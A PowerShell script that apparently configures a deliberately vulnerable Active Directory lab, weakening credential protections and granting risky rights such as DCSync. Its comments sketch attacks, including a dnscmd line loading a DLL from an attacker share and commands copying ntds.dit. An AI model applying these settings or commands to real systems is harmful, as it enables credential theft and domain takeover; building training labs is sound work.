#Requires -RunAsAdministrator
#Requires -Modules ActiveDirectory

# =============================================================================
# Setup-ExtraAttacks.ps1
# Adds additional attack surfaces to the existing corp.local lab.
# Safe to run on top of Setup-CorpLocal.ps1 — idempotent, nothing is removed.
#
# New attack surfaces added:
#   - Silver Ticket         (service accounts already exist)
#   - Skeleton Key          (disable LSASS RunAsPPL protection)
#   - Pass-the-Hash         (UAC filter + local admin via GPO)
#   - WDigest               (cleartext credentials in LSASS)
#   - NTLMv1                (weaker NTLM for relay attacks)
#   - PrinterBug/PetitPotam (Print Spooler service enabled)
#   - WebDAV relay          (WebClient service enabled)
#   - DnsAdmins abuse       (khalid.nasser -> DnsAdmins)
#   - Backup Operators dump (dana.rashid -> Backup Operators)
#   - Account Operators     (nasser.web -> Account Operators)
#   - Second DCSync path    (noura.ahmed gets DCSync rights)
#   - WriteSPN abuse        (targeted Kerberoasting via WriteSPN ACE)
# =============================================================================

Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module ActiveDirectory

$DomainFQDN = (Get-ADDomain).DNSRoot
$DomainDN   = (Get-ADDomain).DistinguishedName
$DCHostname = $env:COMPUTERNAME

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "  Setup-ExtraAttacks.ps1" -ForegroundColor Cyan
Write-Host "  Domain : $DomainFQDN" -ForegroundColor Cyan
Write-Host "============================================`n" -ForegroundColor Cyan

# ── Helper ─────────────────────────────────────────────────────────────────────
function Add-MemberSafe {
    param([string]$Group, [string]$Member)
    try {
        $members = Get-ADGroupMember -Identity $Group -ErrorAction SilentlyContinue |
                   Select-Object -ExpandProperty SamAccountName
        if ($members -notcontains $Member) {
            Add-ADGroupMember -Identity $Group -Members $Member -ErrorAction Stop
            Write-Host "  [+] $Member -> $Group" -ForegroundColor Green
        } else {
            Write-Host "  [~] $Member already in $Group" -ForegroundColor DarkGray
        }
    } catch {
        Write-Host "  [!] $Group / $Member - $_" -ForegroundColor Red
    }
}

function Set-RegSafe {
    param([string]$Path, [string]$Name, $Value, [string]$Type = "DWord")
    try {
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type $Type -Force
        Write-Host "  [+] $Name = $Value ($Path)" -ForegroundColor Green
    } catch {
        Write-Host "  [!] Registry $Name - $_" -ForegroundColor Red
    }
}

# ════════════════════════════════════════════════════════════════════════════════
# 1. WDigest — Store credentials in cleartext in LSASS
#    Attack: dump cleartext passwords with mimikatz sekurlsa::wdigest
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "[*] 1. Enabling WDigest (cleartext creds in LSASS)..." -ForegroundColor Yellow
Set-RegSafe "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" "UseLogonCredential" 1

# ════════════════════════════════════════════════════════════════════════════════
# 2. NTLMv1 — Weaken NTLM authentication
#    Attack: downgrade NTLM to v1, easier to crack/relay
#    LmCompatibilityLevel: 0=LM+NTLM, 1=LM+NTLMv1, 2=NTLMv2
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 2. Enabling NTLMv1..." -ForegroundColor Yellow
Set-RegSafe "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "LmCompatibilityLevel" 1
Set-RegSafe "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "NoLmHash" 0

# ════════════════════════════════════════════════════════════════════════════════
# 3. Disable LSASS RunAsPPL Protection
#    Attack: Skeleton Key (mimikatz misc::skeleton) — patches LSASS to accept
#            any password for any domain account
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 3. Disabling LSASS RunAsPPL (enables Skeleton Key)..." -ForegroundColor Yellow
Set-RegSafe "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "RunAsPPL" 0
# Also disable Credential Guard
Set-RegSafe "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" "LsaCfgFlags" 0

# ════════════════════════════════════════════════════════════════════════════════
# 4. Pass-the-Hash — Disable UAC remote token filtering
#    Attack: PTH with local Administrator hash to access admin shares (C$, ADMIN$)
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 4. Disabling UAC remote token filter (enables Pass-the-Hash)..." -ForegroundColor Yellow
Set-RegSafe "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1

# ════════════════════════════════════════════════════════════════════════════════
# 5. Print Spooler — Enable for coercion attacks
#    Attack: PrinterBug / MS-RPRN to coerce DC authentication
#    PetitPotam (MS-EFSRPC) doesn't need Spooler but Spooler enables PrinterBug
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 5. Enabling Print Spooler (PrinterBug / MS-RPRN coercion)..." -ForegroundColor Yellow
try {
    Set-Service -Name Spooler -StartupType Automatic -ErrorAction Stop
    Start-Service -Name Spooler -ErrorAction Stop
    Write-Host "  [+] Print Spooler enabled and running" -ForegroundColor Green
} catch {
    Write-Host "  [!] Spooler - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# 6. WebClient Service — Enable for NTLM relay via WebDAV
#    Attack: Coerce DC auth over HTTP (WebDAV), relay to ADCS or LDAP
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 6. Enabling WebClient service (WebDAV relay)..." -ForegroundColor Yellow
try {
    Set-Service -Name WebClient -StartupType Automatic -ErrorAction Stop
    Start-Service -Name WebClient -ErrorAction Stop
    Write-Host "  [+] WebClient service enabled and running" -ForegroundColor Green
} catch {
    Write-Host "  [~] WebClient may not be available on Server (client feature) - skipping" -ForegroundColor DarkGray
}

# ════════════════════════════════════════════════════════════════════════════════
# 7. DnsAdmins Abuse — khalid.nasser
#    Attack: DnsAdmins can load arbitrary DLL into DNS service (runs as SYSTEM)
#            dnscmd /config /serverlevelplugindll \\attacker\share\evil.dll
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 7. DnsAdmins abuse — adding khalid.nasser..." -ForegroundColor Yellow
Add-MemberSafe "DnsAdmins" "khalid.nasser"

# ════════════════════════════════════════════════════════════════════════════════
# 8. Backup Operators — dana.rashid
#    Attack: Backup Operators can read any file (backup privilege).
#            Use to copy NTDS.dit and SYSTEM hive -> dump all hashes offline
#            reg save HKLM\SYSTEM  C:\loot\system.hive
#            Copy-Item \\DC-01\C$\Windows\NTDS\ntds.dit
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 8. Backup Operators — adding dana.rashid..." -ForegroundColor Yellow
Add-MemberSafe "Backup Operators" "dana.rashid"

# ════════════════════════════════════════════════════════════════════════════════
# 9. Account Operators — nasser.web
#    Attack: Account Operators can create/modify accounts in most OUs
#            Create new user -> add to groups -> escalate
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 9. Account Operators — adding nasser.web..." -ForegroundColor Yellow
Add-MemberSafe "Account Operators" "nasser.web"

# ════════════════════════════════════════════════════════════════════════════════
# 10. Second DCSync path — noura.ahmed
#     Attack: Alternative DCSync path after compromising noura.ahmed via GenericAll
#     noura.ahmed already has GenericAll over faisal.omar (from Setup-CorpLocal.ps1)
#     Now she also gets her own DCSync rights for a second independent path
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 10. Adding second DCSync path (noura.ahmed)..." -ForegroundColor Yellow
try {
    $principal = Get-ADUser -Identity "noura.ahmed" -ErrorAction Stop
    $Sid = [System.Security.Principal.SecurityIdentifier]$principal.SID

    $adRights1 = [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight"
    $adRights2 = [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight"

    $guid1 = [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" # DS-Replication-Get-Changes
    $guid2 = [guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" # DS-Replication-Get-Changes-All

    $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($Sid, $adRights1, "Allow", $guid1)
    $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($Sid, $adRights2, "Allow", $guid2)

    $domainObj = [adsi]"LDAP://$DomainDN"
    $domainObj.ObjectSecurity.AddAccessRule($ace1)
    $domainObj.ObjectSecurity.AddAccessRule($ace2)
    $domainObj.CommitChanges()
    Write-Host "  [+] noura.ahmed -> DCSync rights granted" -ForegroundColor Green
} catch {
    Write-Host "  [!] DCSync for noura.ahmed - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# 11. WriteSPN abuse — maryam.hassan can add SPN to reem.sultan
#     Attack: Set arbitrary SPN on reem.sultan -> Kerberoast her (targeted)
#             Set-ADUser reem.sultan -ServicePrincipalNames @{Add="fake/spn"}
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 11. WriteSPN ACE — maryam.hassan -> reem.sultan..." -ForegroundColor Yellow
try {
    $principalSid = [System.Security.Principal.SecurityIdentifier](Get-ADUser "maryam.hassan").SID
    $targetDN = (Get-ADUser "reem.sultan").DistinguishedName

    # servicePrincipalName attribute GUID
    $spnGuid = [guid]"f3a64788-5306-11d1-a9c5-0000f80367c1"

    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $principalSid,
        [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty",
        "Allow",
        $spnGuid
    )

    $targetObj = [adsi]"LDAP://$targetDN"
    $targetObj.ObjectSecurity.AddAccessRule($ace)
    $targetObj.CommitChanges()
    Write-Host "  [+] maryam.hassan -> WriteSPN on reem.sultan" -ForegroundColor Green
} catch {
    Write-Host "  [!] WriteSPN - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# 12. Targeted AS-REP — hessa.jaber (new AS-REP roastable account)
#     Extra path to AS-REP roasting
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 12. Adding hessa.jaber to AS-REP roastable..." -ForegroundColor Yellow
try {
    Set-ADAccountControl -Identity "hessa.jaber" -DoesNotRequirePreAuth $true
    Write-Host "  [+] hessa.jaber -> DoesNotRequirePreAuth = True" -ForegroundColor Green
} catch {
    Write-Host "  [!] hessa.jaber - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# 13. Remote Registry — Enable for lateral movement attacks
#     Attack: Access registry remotely to read SAM, SYSTEM hive
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 13. Enabling Remote Registry service..." -ForegroundColor Yellow
try {
    Set-Service -Name RemoteRegistry -StartupType Automatic -ErrorAction Stop
    Start-Service -Name RemoteRegistry -ErrorAction Stop
    Write-Host "  [+] Remote Registry enabled" -ForegroundColor Green
} catch {
    Write-Host "  [!] RemoteRegistry - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# 14. Disable Windows Firewall (lab-only — simplifies lateral movement)
# ════════════════════════════════════════════════════════════════════════════════
Write-Host "`n[*] 14. Disabling Windows Firewall (lab only)..." -ForegroundColor Yellow
try {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "  [+] Windows Firewall disabled" -ForegroundColor Green
} catch {
    Write-Host "  [!] Firewall - $_" -ForegroundColor Red
}

# ════════════════════════════════════════════════════════════════════════════════
# Summary
# ════════════════════════════════════════════════════════════════════════════════
Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  Setup-ExtraAttacks.ps1 complete!" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  New attack paths:" -ForegroundColor White
Write-Host "  Skeleton Key     : RunAsPPL disabled, mimikatz misc::skeleton works" -ForegroundColor Gray
Write-Host "  Pass-the-Hash    : LocalAccountTokenFilterPolicy = 1" -ForegroundColor Gray
Write-Host "  WDigest          : Cleartext creds in LSASS" -ForegroundColor Gray
Write-Host "  PrinterBug       : Print Spooler running -> coerce DC auth" -ForegroundColor Gray
Write-Host "  DnsAdmins        : khalid.nasser -> DLL injection via DNS" -ForegroundColor Gray
Write-Host "  Backup Operators : dana.rashid -> dump NTDS.dit offline" -ForegroundColor Gray
Write-Host "  Account Operators: nasser.web -> create/modify accounts" -ForegroundColor Gray
Write-Host "  DCSync (2nd)     : noura.ahmed -> independent DCSync path" -ForegroundColor Gray
Write-Host "  WriteSPN         : maryam.hassan -> targeted Kerberoast reem.sultan" -ForegroundColor Gray
Write-Host "  AS-REP (extra)   : hessa.jaber -> AS-REP roastable" -ForegroundColor Gray
Write-Host ""
